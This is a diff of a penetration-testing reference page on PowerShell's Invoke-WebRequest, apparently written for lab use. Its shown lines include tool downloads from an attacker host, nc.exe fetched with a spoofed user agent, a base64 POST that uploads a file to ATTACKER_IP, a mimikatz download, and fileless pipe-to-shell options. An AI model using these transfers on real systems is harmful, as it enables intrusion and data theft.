@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/invoke-webrequest.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Save an HTTP response to a Windows file
+[Search this tool’s saved examples](/commands/notebook?tool=invoke-webrequest) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Save an HTTP response to a Windows file
 
 **Run in:** Windows PowerShell. **Requires:** A reachable file URL and a writable destination; the server must serve the requested filename.
 
@@ -21,146 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 Invoke-WebRequest -UseBasicParsing -Uri 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
 ```
 
-**Read the result:** Inspect response status and the resulting file, especially if the endpoint redirects or requires authentication.
-
-**If A successful request saves an error page or unexpected content:** Use -OutFile for a download; a downloaded login/error page can have the expected filename while containing no useful artifact.
+**What the result establishes:** Inspect response status and the resulting file, especially if the endpoint redirects or requires authentication.
 
 **Next check:** Inspect response status and content type when troubleshooting, then verify size and digest against the original.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Invoke-WebRequest: choose the operation and read the result
-
-Download a file in PowerShell.
-
-### What the result establishes
-
-Inspect response status and the resulting file, especially if the endpoint redirects or requires authentication.
-
-### Prerequisites and common failures
-
-Use -OutFile for a download; a downloaded login/error page can have the expected filename while containing no useful artifact.
-
-### Example 1: Commands
-
-Run in: **Windows PowerShell**.
-
-```powershell
-Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
-```
-
-### Example 2: PowerShell Web Downloads
-
-Run in: **Saved lab example**.
-
-```powershell
-Invoke-WebRequest http://<IP>/file.exe -OutFile file.exe
-```
-
-Saved context: [File Transfers for Linux and Windows — PowerShell Web Downloads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 3: PowerShell Web Downloads
-
-Run in: **Saved lab example**.
-
-```powershell
-Invoke-WebRequest http://<IP>/file.exe -UseBasicParsing -OutFile file.exe
-```
-
-Saved context: [File Transfers for Linux and Windows — PowerShell Web Downloads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-downloads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 4: Spoofing User Agents
-
-Run in: **Saved lab example**.
-
-```powershell
-$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-Invoke-WebRequest http://<IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
-```
-
-Saved context: [File Transfers for Linux and Windows — Spoofing User Agents](/post-exploitation/file-transfers-cheat-sheet#spoofing-user-agents). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 5: PowerShell Web Uploads
-
-Run in: **Saved lab example**.
-
-```powershell
-$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\path\to\file' -Encoding Byte))
-Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
-```
-
-Saved context: [File Transfers for Linux and Windows — PowerShell Web Uploads](/post-exploitation/file-transfers-cheat-sheet#powershell-web-uploads). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 6: Quick Decision Tree
-
-Run in: **Saved lab example**.
-
-```text
-DOWNLOADING TO WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
-├── Only cmd.exe?       → certutil or bitsadmin
-├── Internal network?   → SMB (impacket-smbserver)
-├── Need fileless?      → IEX + DownloadString
-└── Nothing works?      → Base64 encode/decode via clipboard
-
-DOWNLOADING TO LINUX:
-├── Have curl/wget?     → Use them (simplest)
-├── Need fileless?      → curl | bash  or  wget -qO- | python3
-├── Have Python/PHP?    → Use language one-liners
-├── Nothing available?  → /dev/tcp bash trick
-└── Need encryption?    → OpenSSL s_server/s_client
-
-UPLOADING FROM WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
-├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
-├── Internal network?   → SMB or WebDAV
-└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
-
-UPLOADING FROM LINUX:
-├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
-├── Have SCP?           → scp file user@attacker:/path/
-├── Have Python?        → python3 requests.post one-liner
-└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
-```
-
-Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-### Example 7: Quick-start command cheat (run first, always)
-
-Run in: **Saved lab example**.
-
-```powershell
-# 1. Automated
-iwr -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile "C:\temp\winPEAS.exe"
-C:\temp\winPEAS.exe
-
-# 2. Manual "big 5"
-whoami /priv
-whoami /groups
-systeminfo
-net user; net localgroup administrators
-Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
-```
-
-Saved context: [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always-2). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
-
-## Saved commands and notebook recipes
-
-Download a file in PowerShell.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=invoke-webrequest) · [All tools](/index)
 
 ## Commands
 
@@ -170,11 +41,15 @@ Replace UPPER_CASE values with your lab values.
 Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.exe' -OutFile 'C:\Users\Public\file.exe'
 ```
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| A successful request saves an error page or unexpected content | Use -OutFile for a download; a downloaded login/error page can have the expected filename while containing no useful artifact. |
 
 ## Notebook recipes
 
-10 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+9 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -266,7 +141,7 @@ UPLOADING FROM LINUX:
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -293,6 +168,19 @@ Invoke-WebRequest http://<IP>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Pu
 
 </Accordion>
 
+<Accordion title="Download a served file from Kali to Windows">
+
+### Download a served file from Kali to Windows
+
+**Kali → Windows file transfer**
+
+```powershell
+Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
+Get-FileHash 'C:\Users\Public\file.bin' -Algorithm SHA256
+```
+
+</Accordion>
+
 <Accordion title="Downloading TO a Windows target">
 
 ### Downloading TO a Windows target
@@ -309,21 +197,6 @@ copy \\172.16.119.13\share\tool.exe C:\Users\Public\
 # RDP drive redirect — no server at all:
 #   xfreerdp3 ... /drive:kali,/home/kali/loot   then inside Windows:
 copy \\tsclient\kali\tool.exe C:\Users\Public\
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Windows target](/cheatsheets/pivoting-file-transfer#downloading-to-a-windows-target)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Pivoting and File Transfer: Field Reference**
-
-Context from the notebook: Invoke-WebRequest -OutFile  downloads a  single file , never a folder. Point it at the exact  .exe . A folder URL just saves the directory‑listing HTML.
-
-```text
-Invoke-WebRequest -OutFile
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
@@ -387,28 +260,11 @@ powershell -c "Invoke-WebRequest http://172.16.119.13:8080/mimikatz.exe -OutFile
 
 </Accordion>
 
-<Accordion title="⏱️ DECISION HEADER">
-
-### ⏱️ DECISION HEADER
-
-**Pivoting and File Transfer: Field Reference**
-
-Context from the notebook: Download a tool  to  a Windows target Invoke-WebRequest  /  certutil  / SMB / RDP drive to Windows
-
-```text
-Invoke-WebRequest
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pivoting and File Transfer: Field Reference — ⏱️ DECISION HEADER](/cheatsheets/pivoting-file-transfer#-decision-header) · [Pivoting and File Transfer: Field Reference — 🧯 CAVEATS TABLE](/cheatsheets/pivoting-file-transfer#-caveats-table) · [File Transfers for Linux and Windows — User Agent Detection](/post-exploitation/file-transfers-cheat-sheet#user-agent-detection)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 </AccordionGroup>
+
+## Related tools and references
+
+- [Official documentation 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
 
 {/* VAULT_RELATED_START */}
 
@@ -417,5 +273,3 @@ Invoke-WebRequest
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
